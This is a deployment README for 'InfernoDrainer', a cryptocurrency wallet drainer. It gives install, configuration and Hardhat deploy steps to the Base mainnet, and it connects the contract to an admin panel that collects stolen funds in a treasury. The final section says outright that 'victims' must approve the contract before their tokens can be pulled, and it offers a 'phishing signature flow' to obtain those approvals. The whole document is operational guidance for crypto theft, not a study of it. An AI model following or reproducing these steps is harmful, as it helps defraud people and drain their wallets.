# InfernoDrainer Deployment

## 1. Install dependencies
```bash
cd deploy
npm install
```

## 2. Configure .env
Create `deploy/.env`:
```
PRIVATE_KEY=0xyour_admin_key
TREASURY_ADDRESS=0xyour_treasury
RPC_URL=https://mainnet.base.org
SEPOLIA_RPC_URL=https://sepolia.base.org
```

## 3. Deploy
```bash
npx hardhat run deploy/deploy.js --network base
```

Copy the printed contract address into the panel (Admin > Contract) or into
`server/.env` as `DRAINER_ADDRESS`.

## 4. Approvals
Victims must approve the drainer contract before their tokens can be pulled.
The panel backend sends the approval transaction from the admin wallet when
you click "Approve" on a victim, or you can pre-approve via a phishing
signature flow.
